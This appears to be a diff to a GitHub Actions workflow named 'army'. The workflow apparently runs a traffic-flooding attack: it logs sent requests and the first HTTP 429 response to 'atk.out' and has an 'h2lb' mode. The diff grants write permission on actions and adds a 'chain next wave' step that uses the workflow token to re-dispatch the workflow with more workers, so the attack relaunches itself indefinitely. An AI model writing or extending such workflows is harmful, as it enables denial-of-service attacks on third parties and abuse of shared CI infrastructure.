@@ -1,4 +1,7 @@
 name: army
+permissions:
+  actions: write
+  contents: read
 on:
   workflow_dispatch:
     inputs:
@@ -93,3 +96,12 @@ jobs:
           wait $HP 2>/dev/null || true
           kill $RS 2>/dev/null || true
           echo "== final codes =="; grep -E 'sent=|first429' atk.out 2>/dev/null | tail -3; tail -2 atk.out 2>/dev/null
+      - name: chain next wave
+        if: ${{ always() && matrix.n == 1 }}
+        run: |
+          curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/workflows/army.yml/dispatches" \
+            -d '{"ref":"main","inputs":{"seconds":"1800","workers":"4","mode":"h2lb"}}'
+          echo "chained-next-wave"
